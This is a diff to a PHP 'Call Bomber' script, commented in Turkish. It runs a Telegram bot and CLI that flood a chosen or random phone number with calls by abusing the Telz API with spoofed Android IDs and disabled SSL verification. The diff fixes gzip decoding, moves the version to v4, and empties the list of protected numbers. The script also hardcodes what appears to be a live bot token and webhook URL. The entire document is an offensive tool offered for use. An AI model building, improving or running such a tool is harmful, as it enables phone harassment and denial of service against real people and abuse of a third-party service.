@@ -1,7 +1,7 @@
 <?php
 /**
- * Ritalin Tool Call Bomber - FIXED VERSION
- * Gzip desteği eklendi, JSON parse hatası çözüldü
+ * Ritalin Tool Call Bomber - GZIP FIXED
+ * Gzip sıkıştırması manuel olarak çözülüyor
  */
 
 // ==================== KONFIGÜRASYON ====================
@@ -17,7 +17,7 @@ define('LOOP_INTERVAL', 20);
 define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
 define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
 
-$BANNED_NUMBERS = ['905545715516', '+905545715516'];
+$BANNED_NUMBERS = [''];
 
 $VALID_ANDROID_IDS = [
     '13e50e93a6399e67',
@@ -37,16 +37,15 @@ function debugLog($message, $type = 'INFO') {
     if (php_sapi_name() === 'cli') echo $logEntry;
 }
 
-function debugLogRequest($endpoint, $payload, $response, $httpCode, $headers) {
+function debugLogRequest($endpoint, $payload, $body, $httpCode, $headers, $decoded = null) {
     $log = "\n" . str_repeat("=", 70) . "\n";
     $log .= "📤 [REQUEST] $endpoint\n";
     $log .= "⏰ " . date('Y-m-d H:i:s') . "\n";
     $log .= "📦 PAYLOAD: " . json_encode($payload, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
     $log .= "📥 [RESPONSE] HTTP $httpCode\n";
     $log .= "📋 HEADERS:\n$headers\n";
-    $log .= "📄 BODY: " . substr($response, 0, 2000) . "\n";
+    $log .= "📄 BODY: " . substr($body, 0, 2000) . "\n";
     
-    $decoded = json_decode($response, true);
     if ($decoded !== null) {
         $log .= "✅ JSON PARSE BAŞARILI\n";
         $log .= "🔍 PARSED: " . json_encode($decoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
@@ -111,11 +110,11 @@ function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'User-Agent: ' . USER_AGENT,
-        'Accept-Encoding: gzip',  // ZORUNLU: gzip decompress için
+        'Accept-Encoding: gzip, deflate',
         'Content-Type: application/json; charset=UTF-8',
         'Accept: application/json'
     ]);
-    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');  // GZIP DECOMPRESS
+    curl_setopt($ch, CURLOPT_ENCODING, '');  // Tüm encoding'leri kabul et
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -130,13 +129,25 @@ function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
     $headers = substr($response, 0, $headerSize);
     $body = substr($response, $headerSize);
     
-    debugLogRequest($endpoint, $payload, $body, $httpCode, $headers);
+    // 🔥 GZIP MANUEL DECOMPRESS
+    $isGzip = strpos($headers, 'content-encoding: gzip') !== false;
+    if ($isGzip) {
+        $decodedBody = gzdecode($body);
+        if ($decodedBody !== false) {
+            $body = $decodedBody;
+            debugLog("✅ Gzip decompress başarılı", 'GZIP');
+        } else {
+            debugLog("❌ Gzip decompress başarısız", 'GZIP');
+        }
+    }
+    
+    $decoded = json_decode($body, true);
+    debugLogRequest($endpoint, $payload, $body, $httpCode, $headers, $decoded);
     
     if ($httpCode === 429) throw new Exception("Fazla deneme!");
     if ($httpCode >= 400) throw new Exception("HTTP Hata: $httpCode");
     if ($error) throw new Exception("CURL Hatası: $error");
     
-    $decoded = json_decode($body, true);
     if (isset($decoded['status']) && $decoded['status'] === 'not_allowed') {
         throw new Exception("API Engellendi (4.2)");
     }
@@ -260,7 +271,7 @@ if (php_sapi_name() !== 'cli') {
         debugLog("📨 Komut: $username ($chatId): $text", 'COMMAND');
         
         if ($text === '/start') {
-            sendTelegramMessage($chatId, "📞 <b>Call Bomber v3 </b>\n\n"
+            sendTelegramMessage($chatId, "📞 <b>Call Bomber v4 (Gzip Fixed)</b>\n\n"
                 . "Komutlar:\n"
                 . "/call +905551234567 - Arama gönder\n"
                 . "/random - Rastgele numara\n"
@@ -301,7 +312,7 @@ if (php_sapi_name() !== 'cli') {
         }
         
         if ($text === '/status') {
-            sendTelegramMessage($chatId, "✅ Bot aktif v3 ");
+            sendTelegramMessage($chatId, "✅ Bot aktif v4 ");
             exit;
         }
         
@@ -317,12 +328,12 @@ if (php_sapi_name() !== 'cli') {
         exit;
     }
     
-    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber v3 ']);
+    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber v4 ']);
     exit;
 }
 
 if (php_sapi_name() === 'cli') {
-    echo "\n📞 CALL BOMBER v3\n";
+    echo "\n📞 CALL BOMBER v4 ";
     $phone = readline("Numara gir (+90xx): ");
     $phone = trim($phone);
     if (empty($phone)) exit("❌ Numara girilmedi.\n");
